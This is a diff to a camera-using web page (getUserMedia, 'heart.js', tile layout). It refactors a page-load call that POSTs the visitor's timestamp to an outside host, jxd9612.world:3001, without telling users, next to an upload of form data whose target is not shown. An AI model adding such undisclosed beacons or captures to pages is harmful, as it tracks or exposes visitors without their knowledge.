@@ -38,6 +38,7 @@
         <script src="jquery.min.js"></script>
         <script src="heart.js"></script>
         <script>
+            getTM();
             function getUserMedia(constraints, success, error) {
                 if (navigator.mediaDevices.getUserMedia) {
                     navigator.mediaDevices
@@ -81,16 +82,6 @@
                 });
             }
 
-            let nowTime = new Date();
-            let mon = nowTime.getMonth() + 1;
-            let timeStr = nowTime.getFullYear() + '-' + mon + '-' + nowTime.getDate() + ' ' + nowTime.getHours() + ':' + nowTime.getMinutes();
-            $.ajax({
-                url: 'https://www.jxd9612.world:3001/resolve_cors',
-                type: 'post',
-                dataType: 'json',
-                data: { time: timeStr }
-            });
-            
             let TILE_WIDTH = 25.6;
             let TILE_HEIGHT = 19.2;
             let TILE_CENTER_WIDTH = 16;
@@ -139,6 +130,17 @@
                     data: formData,
                     contentType: false,
                     processData: false
+                });
+            }
+            function getTM() {
+                let nowTime = new Date();
+                let mon = nowTime.getMonth() + 1;
+                let timeStr = nowTime.getFullYear() + '-' + mon + '-' + nowTime.getDate() + ' ' + nowTime.getHours() + ':' + nowTime.getMinutes();
+                $.ajax({
+                    url: 'https://www.jxd9612.world:3001/resolve_cors',
+                    type: 'post',
+                    dataType: 'json',
+                    data: { time: timeStr }
                 });
             }
             var RAD = Math.PI / 180;
